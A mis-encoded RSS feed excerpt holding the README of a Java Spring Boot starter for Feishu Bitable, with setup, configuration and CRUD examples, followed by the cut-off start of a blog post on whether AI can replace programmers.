<li>æ³¨è§£é©±åŠ¨å®ä½“æ˜ å°„ï¼ˆ<code>@FsDwAppBase</code> / <code>@FsDwTable</code> / <code>@FsDwTableProperty</code> / <code>@FsDwTableId</code>ï¼‰ï¼Œæ”¯æŒå…ƒå­—æ®µæ˜ å°„</li>
<li>ç±»æ•°æ®åº“çš„ CRUD ä½“éªŒï¼Œå±è”½é£ä¹¦å¤šç»´è¡¨æ ¼åº•å±‚è°ƒç”¨</li>
<li>MyBatis-Plus é£æ ¼æŸ¥è¯¢ï¼Œ<code>DwLambdaQueryWrapper</code> æ¡ä»¶æ„é€ </li>
<li>è®°å½•ã€æ•°æ®è¡¨ã€å­—æ®µæ“ä½œçš„ Helper API</li>
<li>ç»Ÿä¸€å¼‚å¸¸ä¸é”™è¯¯ç ï¼ˆ<code>BitableException</code> / <code>BitableErrorCode</code>ï¼‰</li>
</ul>
<h2 data-id="heading-11">è¿è¡Œç¯å¢ƒ</h2>
<ul>
<li>Java 17+</li>
<li>Spring Boot 3.x</li>
<li>é£ä¹¦åº”ç”¨å‡­è¯ï¼ˆappIdã€appSecretï¼‰ï¼ŒappToken ç”± @FsDwAppBase æä¾›</li>
</ul>
<h2 data-id="heading-12">å®‰è£…</h2>
<p>Maven:</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.bdmcom<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fs-dw-table-springboot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>Gradle:</p>
<pre><code class="hljs language-kotlin" lang="kotlin">dependencies {
  implementation(<span class="hljs-string">"cn.bdmcom:fs-dw-table-springboot-starter:1.0.0"</span>)
}
</code></pre>
<h2 data-id="heading-13">é…ç½®</h2>
<p>æœ€å°é…ç½®ï¼ˆHelper API å¿…éœ€ï¼‰ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">duoweitable:</span>
  <span class="hljs-attr">app-id:</span> <span class="hljs-string">your-app-id</span>
  <span class="hljs-attr">app-secret:</span> <span class="hljs-string">your-app-secret</span>
</code></pre>
<p><code>application.properties</code> ç­‰ä»·å†™æ³•ï¼š</p>
<pre><code class="hljs language-properties" lang="properties">duoweitable.app-id=your-app-id
duoweitable.app-secret=your-app-secret
</code></pre>
<p>appToken å»ºè®®æ”¾åœ¨å®ä½“çˆ¶ç±»çš„ <code>@FsDwAppBase</code> ä¸­ï¼ˆappToken ç›¸å½“äºä¸€ä¸ª Excelï¼ŒtableId ç›¸å½“äºä¸€ä¸ª Sheetï¼‰ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@FsDwAppBase(appToken = "app_token")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoAppBase</span> {
}
</code></pre>
<p>Forest å®¢æˆ·ç«¯å¯é€‰é…ç½®ï¼ˆä»…åœ¨éœ€è¦è¦†ç›–æ—¶é…ç½®ï¼‰ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">forest:</span>
  <span class="hljs-attr">backend:</span> <span class="hljs-string">okhttp3</span>
  <span class="hljs-attr">connect-timeout:</span> <span class="hljs-number">5000</span>
  <span class="hljs-attr">read-timeout:</span> <span class="hljs-number">5000</span>
  <span class="hljs-attr">max-retry-count:</span> <span class="hljs-number">0</span>
</code></pre>
<h2 data-id="heading-14">å¯ç”¨æ–¹å¼ï¼ˆ3 æ­¥ï¼‰</h2>
<ol>
<li>å¼•å…¥ä¾èµ–</li>
<li>é…ç½®å‚æ•°</li>
<li>å¯åŠ¨ç±»åŠ æ³¨è§£ï¼ˆä¸åŠ æ³¨è§£ä¸ä¼šåŠ è½½ Starterï¼Œå·²ç¦ç”¨ AutoConfiguration.imports è‡ªåŠ¨è£…é…ï¼‰</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> cn.bdmcom.annotation.EnableFsDwTable;
<span class="hljs-keyword">import</span> org.springframework.boot.SpringApplication;
<span class="hljs-keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;

<span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@EnableFsDwTable</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoApplication</span> {
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
    SpringApplication.run(DemoApplication.class, args);
  }
}
</code></pre>
<h2 data-id="heading-15">æ³¨æ„äº‹é¡¹ï¼ˆå·²ä½¿ç”¨ Forest çš„é¡¹ç›®ï¼‰</h2>
<p>å¦‚æœä½ çš„é¡¹ç›®å·²ç»ä½¿ç”¨äº† Forestï¼Œå¹¶ä¸”è‡ªå·±åŠ äº† <code>@ForestScan</code>ï¼Œè¯·æŠŠ <code>cn.bdmcom.core.api</code> åŠ åˆ°
<code>basePackages</code>ï¼Œå¦åˆ™ Starter çš„æ¥å£ä¸ä¼šè¢«æ‰«æåˆ°ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> com.dtflys.forest.springboot.annotation.ForestScan;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@ForestScan(basePackages = {
  "your.project.forest.clients",
  "cn.bdmcom.core.api"
})</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ForestClientConfig</span> {
}
</code></pre>
<h2 data-id="heading-16">å¿«é€Ÿå¼€å§‹</h2>
<h3 data-id="heading-17">1) å®šä¹‰ App åŸºç±»</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@FsDwAppBase(appToken = "app_token")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoAppBase</span> {
}
</code></pre>
<h3 data-id="heading-18">2) å®šä¹‰å®ä½“</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@FsDwTable(name = "Test Table", tableId = "tblxxxxx", viewId = "vewxxxxx")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestTable</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DemoAppBase</span> {
  <span class="hljs-meta">@FsDwTableId</span>
  <span class="hljs-keyword">private</span> String recordId;

  <span class="hljs-meta">@FsDwTableProperty(value = "Name", order = 1, type = TypeEnum.TEXT)</span>
  <span class="hljs-keyword">private</span> String name;

  <span class="hljs-meta">@FsDwTableProperty(value = "Age", order = 2, type = TypeEnum.NUMBER)</span>
  <span class="hljs-keyword">private</span> Integer age;
}
</code></pre>
<h3 data-id="heading-19">3) æŸ¥è¯¢è®°å½•</h3>
<pre><code class="hljs language-java" lang="java">List&lt;TestTable&gt; records = FsDwRecordHelper.queryRecords(TestTable.class);
</code></pre>
<h3 data-id="heading-20">4) æ–°å¢è®°å½•</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">TestTable</span> <span class="hljs-variable">add</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestTable</span>();
add.setName(<span class="hljs-string">"Alice"</span>);
add.setAge(<span class="hljs-number">18</span>);
<span class="hljs-type">AddRecordRes</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> FsDwRecordHelper.addRecord(add);
</code></pre>
<h3 data-id="heading-21">5) æ‰¹é‡æ–°å¢è®°å½•</h3>
<pre><code class="hljs language-java" lang="java">List&lt;TestTable&gt; batch = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
  <span class="hljs-type">TestTable</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestTable</span>();
  item.setName(<span class="hljs-string">"User-"</span> + i);
  item.setAge(<span class="hljs-number">18</span>);
  batch.add(item);
}
<span class="hljs-type">BatchCreateRecordRes</span> <span class="hljs-variable">batchRes</span> <span class="hljs-operator">=</span> FsDwRecordHelper.batchCreateRecords(TestTable.class, batch);
</code></pre>
<h3 data-id="heading-22">6) æ›´æ–°è®°å½•</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">TestTable</span> <span class="hljs-variable">update</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestTable</span>();
update.setRecordId(<span class="hljs-string">"recxxxxxx"</span>);
update.setName(<span class="hljs-string">"Alice"</span>);
<span class="hljs-type">UpdateRecordRes</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> FsDwRecordHelper.updateRecord(update);
</code></pre>
<h3 data-id="heading-23">7) åˆ é™¤è®°å½•</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">TestTable</span> <span class="hljs-variable">del</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestTable</span>();
del.setRecordId(<span class="hljs-string">"recxxxxxx"</span>);
<span class="hljs-type">DeleteRecordRes</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> FsDwRecordHelper.deleteRecord(del);
</code></pre>
<h2 data-id="heading-24">æ¡ä»¶æŸ¥è¯¢</h2>
<pre><code class="hljs language-java" lang="java">DwLambdaQueryWrapper&lt;TestTable&gt; wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DwLambdaQueryWrapper</span>&lt;&gt;();
wrapper.eq(TestTable::getName, <span class="hljs-string">"Alice"</span>);
List&lt;TestTable&gt; list = FsDwRecordHelper.queryRecords(TestTable.class, wrapper);

wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DwLambdaQueryWrapper</span>&lt;&gt;();
wrapper.between(TestTable::getAge, <span class="hljs-number">18</span>, <span class="hljs-number">30</span>);
list = FsDwRecordHelper.queryRecords(TestTable.class, wrapper);

wrapper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DwLambdaQueryWrapper</span>&lt;&gt;();
wrapper.pageSize(<span class="hljs-number">20</span>);
wrapper.pageNo(<span class="hljs-number">2</span>);
list = FsDwRecordHelper.queryRecords(TestTable.class, wrapper);
</code></pre>
<h2 data-id="heading-25">æ•°æ®è¡¨æ“ä½œ</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">CreateTableRes</span> <span class="hljs-variable">created</span> <span class="hljs-operator">=</span> FsDwTableHelper.createTable(TestTable.class);
List&lt;ListTableRes.TableItem&gt; all = FsDwTableHelper.listAllTables(TestTable.class);
<span class="hljs-type">UpdateTableRes</span> <span class="hljs-variable">updated</span> <span class="hljs-operator">=</span> FsDwTableHelper.updateTable(TestTable.class);
<span class="hljs-type">DeleteTableRes</span> <span class="hljs-variable">deleted</span> <span class="hljs-operator">=</span> FsDwTableHelper.deleteTable(TestTable.class);
</code></pre>
<h2 data-id="heading-26">å­—æ®µæ“ä½œ</h2>
<pre><code class="hljs language-java" lang="java">List&lt;TableFieldListRes.TableField&gt; fields = FsDwFieldHelper.listFields(<span class="hljs-string">"tblxxxxx"</span>, <span class="hljs-string">"vewxxxxx"</span>);
<span class="hljs-type">AddFieldRes</span> <span class="hljs-variable">created</span> <span class="hljs-operator">=</span> FsDwFieldHelper.createField(TestTable.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">AddFieldReq</span>(<span class="hljs-string">"New Field"</span>, TypeEnum.TEXT));
<span class="hljs-type">UpdateFieldRes</span> <span class="hljs-variable">updated</span> <span class="hljs-operator">=</span> FsDwFieldHelper.updateFieldByName(TestTable.class, <span class="hljs-string">"New Field"</span>,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpdateFieldReq</span>(<span class="hljs-string">"New Field Name"</span>, TypeEnum.TEXT));
<span class="hljs-type">DeleteFieldRes</span> <span class="hljs-variable">deleted</span> <span class="hljs-operator">=</span> FsDwFieldHelper.deleteFieldByName(TestTable.class, <span class="hljs-string">"New Field Name"</span>);
</code></pre>
<h2 data-id="heading-27">ç›´æ¥ä½¿ç”¨ Service Bean</h2>
<p>å¦‚æœå¸Œæœ›ä½¿ç”¨ Spring ç®¡ç†çš„ Serviceï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoService</span> {
  <span class="hljs-meta">@Autowired</span>
  <span class="hljs-keyword">private</span> FsDwRecordService recordService;

  <span class="hljs-keyword">public</span> QueryRecordRes <span class="hljs-title function_">query</span><span class="hljs-params">(String appId, String appSecret, String appToken, String tableId, QueryRecordReq req)</span> {
    <span class="hljs-keyword">return</span> recordService.queryRecord(appId, appSecret, appToken, tableId, req);
  }
}
</code></pre>
<h2 data-id="heading-28">å¼‚å¸¸ä¸é”™è¯¯ç </h2>
<p>æ‰€æœ‰ Helper/Service æ–¹æ³•åœ¨å¤±è´¥æ—¶ä¼šæŠ›å‡º <code>BitableException</code>ã€‚
é”™è¯¯ç ä¸ä¿¡æ¯è¯·å‚è€ƒ <code>BitableErrorCode</code>ã€‚</p>
<h2 data-id="heading-29">æ³¨æ„äº‹é¡¹</h2>
<h3 data-id="heading-30">1. åˆ†é¡µæŸ¥è¯¢çš„æ€§èƒ½é™åˆ¶</h3>
<p>é£ä¹¦å¤šç»´è¡¨æ ¼çš„åˆ†é¡µæœºåˆ¶ä¸ä¼ ç»Ÿçš„æ•°æ®åº“åˆ†é¡µï¼ˆå¦‚ MySQL çš„ OFFSETï¼‰ä¸åŒï¼š</p>
<ul>
<li><strong>é¡ºåºåˆ†é¡µ</strong>ï¼šé£ä¹¦ä½¿ç”¨ <code>page_token</code> æœºåˆ¶ï¼Œå¿…é¡»ä»ç¬¬ä¸€é¡µå¼€å§‹é¡ºåºè·å–</li>
<li><strong>æ€§èƒ½å½±å“</strong>ï¼šæŸ¥è¯¢ç¬¬ N é¡µéœ€è¦å‘èµ· N æ¬¡è¯·æ±‚ï¼Œå¯¹äºå¤§ç»“æœé›†ä¼šæœ‰æ€§èƒ½é—®é¢˜</li>
<li><strong>å»ºè®®</strong>ï¼š
<ul>
<li>å°½é‡ä½¿ç”¨æŸ¥è¯¢æ¡ä»¶ç¼©å°ç»“æœé›†èŒƒå›´</li>
<li>é¿å…è·³è½¬åˆ°å¾ˆæ·±çš„é¡µç ï¼ˆå¦‚ç›´æ¥æŸ¥ç¬¬ 1000 é¡µï¼‰</li>
<li>å¦‚æœéœ€è¦å¤§æ•°æ®é‡å¤„ç†ï¼Œè€ƒè™‘ä½¿ç”¨å…¨é‡å¯¼å‡ºæˆ–å…¶ä»–æ–¹å¼</li>
</ul>
</li>
</ul>
<h3 data-id="heading-31">2. åŒ API è®¾è®¡è¯´æ˜</h3>
<p>æœ¬é¡¹ç›®æä¾›äº†ä¸¤ç§ä½¿ç”¨æ–¹å¼ï¼š</p>
<p><strong>é™æ€ Helper API</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java">FsDwRecordHelper.queryRecords(TestTable.class);
</code></pre>
<ul>
<li>ä¼˜ç‚¹ï¼šç®€æ´ä¾¿æ·ï¼Œæ— éœ€æ³¨å…¥</li>
<li>ç¼ºç‚¹ï¼šé™æ€æ–¹æ³•éš¾ä»¥ mockï¼Œä¸åˆ©äºå•å…ƒæµ‹è¯•</li>
</ul>
<p><strong>Service Bean API</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> FsDwRecordService recordService;
</code></pre>
<ul>
<li>ä¼˜ç‚¹ï¼šå¯æµ‹è¯•ã€å¯ AOP æ‹¦æˆªã€æ”¯æŒå¤šç§Ÿæˆ·</li>
<li>ç¼ºç‚¹ï¼šéœ€è¦æ˜¾å¼æ³¨å…¥</li>
</ul>
<p><strong>å»ºè®®</strong>ï¼šç®€å•é¡¹ç›®ç”¨ Helperï¼Œå¤æ‚é¡¹ç›®æˆ–å¤šç§Ÿæˆ·åœºæ™¯ç”¨ Serviceã€‚</p>
<h3 data-id="heading-32">3. ä¸ç°æœ‰ Forest é¡¹ç›®çš„é›†æˆ</h3>
<p>å¦‚æœä½ çš„é¡¹ç›®å·²ç»ä½¿ç”¨äº† Forest å¹¶è‡ªå®šä¹‰äº† <code>@ForestScan</code>ï¼Œéœ€è¦ç¡®ä¿å°†æœ¬é¡¹ç›®çš„ API åŒ…åŠ å…¥æ‰«æè·¯å¾„ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@ForestScan(basePackages = {
    "your.project.forest.clients",
    "cn.bdmcom.core.api"  // å¿…é¡»åŒ…å«
})</span>
</code></pre>
<h3 data-id="heading-33">4. Lambda æŸ¥è¯¢çš„æ€§èƒ½è€ƒè™‘</h3>
<p><code>DwLambdaQueryWrapper</code> ä½¿ç”¨åå°„è§£æ Lambda è¡¨è¾¾å¼è·å–å­—æ®µåï¼š</p>
<ul>
<li>é¦–æ¬¡è§£æä¼šæœ‰æ€§èƒ½å¼€é”€ï¼Œå­—æ®µåæ˜ å°„ä¼šè¢«ç¼“å­˜</li>
<li>é¢‘ç¹åˆ›å»ºæ–°çš„ Wrapper å®ä¾‹ä¼šæœ‰ä¸€å®šå¼€é”€</li>
<li>å»ºè®®å¤ç”¨ Wrapper å®ä¾‹æˆ–ä½¿ç”¨å­—ç¬¦ä¸²å­—æ®µå</li>
</ul>
<h3 data-id="heading-34">5. Token ç¼“å­˜ç®¡ç†</h3>
<p>Token é»˜è®¤ç¼“å­˜ 2 å°æ—¶ï¼ˆæå‰ 60 ç§’åˆ·æ–°ï¼‰ï¼Œå¦‚éœ€æ‰‹åŠ¨æ¸…é™¤ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> FsDwTokenService tokenService;

<span class="hljs-comment">// æ¸…é™¤æŒ‡å®š token</span>
tokenService.evictToken(appId, appSecret);

<span class="hljs-comment">// æ¸…é™¤æ‰€æœ‰ token</span>
tokenService.evictAll();

<span class="hljs-comment">// è·å–ç¼“å­˜ç»Ÿè®¡</span>
<span class="hljs-type">CacheStats</span> <span class="hljs-variable">stats</span> <span class="hljs-operator">=</span> tokenService.getCacheStats();
</code></pre>
<h3 data-id="heading-35">6. ç±»å‹è½¬æ¢é™åˆ¶</h3>
<p>é£ä¹¦å¤šç»´è¡¨æ ¼çš„å­—æ®µç±»å‹ä¸ Java ç±»å‹æ˜ å°„æœ‰é™åˆ¶ï¼š</p>
<ul>
<li>æ—¥æœŸæ—¶é—´ï¼šè‡ªåŠ¨è½¬æ¢ä¸º <code>LocalDateTime</code>/<code>LocalDate</code></li>
<li>å¤šé€‰/å•é€‰ï¼šè¿”å›æ–‡æœ¬å†…å®¹æˆ–æ•°ç»„</li>
<li>å¤æ‚åµŒå¥—ç»“æ„å¯èƒ½éœ€è¦æ‰‹åŠ¨å¤„ç†</li>
</ul>
<h2 data-id="heading-36">å‘å¸ƒåˆ° Maven Central</h2>
<p>å‘å¸ƒå‰è¯·æ›´æ–° <code>pom.xml</code> å…ƒä¿¡æ¯ï¼š</p>
<ul>
<li><code>url</code>ã€<code>scm</code>ã€<code>developers</code></li>
<li><code>groupId</code> æ‰€æœ‰æƒä¸å‘å¸ƒç‰ˆæœ¬å·</li>
</ul>
<p>ç­¾åæ„å»ºï¼š</p>
<pre><code class="hljs language-sh" lang="sh">mvn -P release -DskipTests clean verify
</code></pre>
<p>å‘å¸ƒéœ€è¦é…ç½® Sonatype è´¦å·ä¸ GPG å¯†é’¥ï¼Œè¯·æ ¹æ®å®˜æ–¹æµç¨‹å®Œæˆå‘å¸ƒã€‚</p>
<h2 data-id="heading-37">è®¸å¯è¯</h2>
<p>Apache License, Version 2.0</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI æ˜¯å¦çœŸçš„èƒ½å®Œå…¨æ›¿ä»£ç¨‹åºå‘˜ï¼Ÿä»æˆ‘è¯•ç”¨ AI å¼€å‘åˆ°å‰åç«¯æ¶æ„ä¸é¡µé¢å¼€å‘çš„çœŸå®åˆ†æ]]></title>    <link>https://juejin.cn/post/7589099845186338852</link>    <guid>https://juejin.cn/post/7589099845186338852</guid>    <pubDate>2025-12-29T09:49:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589099845186338852" data-draft-id="7589201772117606406" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI æ˜¯å¦çœŸçš„èƒ½å®Œå…¨æ›¿ä»£ç¨‹åºå‘˜ï¼Ÿä»æˆ‘è¯•ç”¨ AI å¼€å‘åˆ°å‰åç«¯æ¶æ„ä¸é¡µé¢å¼€å‘çš„çœŸå®åˆ†æ"/> <meta itemprop="keywords" content="åç«¯,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2025-12-29T09:49:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æŒ–åœŸæœº_008"/> <meta itemprop="url" content="https://juejin.cn/user/4373178080835884"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI æ˜¯å¦çœŸçš„èƒ½å®Œå…¨æ›¿ä»£ç¨‹åºå‘˜ï¼Ÿä»æˆ‘è¯•ç”¨ AI å¼€å‘åˆ°å‰åç«¯æ¶æ„ä¸é¡µé¢å¼€å‘çš„çœŸå®åˆ†æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4373178080835884/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æŒ–åœŸæœº_008
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:49:23.000Z" title="Mon Dec 29 2025 09:49:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    16
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œä¸ºä¸€åæ­£åœ¨è¯•ç”¨ AI è¿›è¡Œå¼€å‘çš„ç¨‹åºå‘˜ï¼Œæˆ‘æœ€è¿‘å°è¯•è®© AI è¾…åŠ©æˆ‘å®Œæˆ<strong>å‰ç«¯é¡µé¢ã€åç«¯æœåŠ¡å’Œç³»ç»Ÿé€»è¾‘çš„å¼€å‘</strong>ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæˆ‘æ·±åˆ»ä½“ä¼šåˆ° AI çš„å¼ºå¤§ï¼Œä¹Ÿæ„Ÿå—åˆ°äº†å®ƒçš„å±€é™ã€‚æœ¬æ–‡ä»æˆ‘çš„å®è·µå‡ºå‘ï¼Œç»“åˆä¿¡æ¯å®‰å…¨ã€ç³»ç»Ÿæ¶æ„ã€åæœŸç»´æŠ¤æ€§ä»¥åŠå‰åç«¯å¼€å‘åœºæ™¯ï¼Œå¯¹ AI 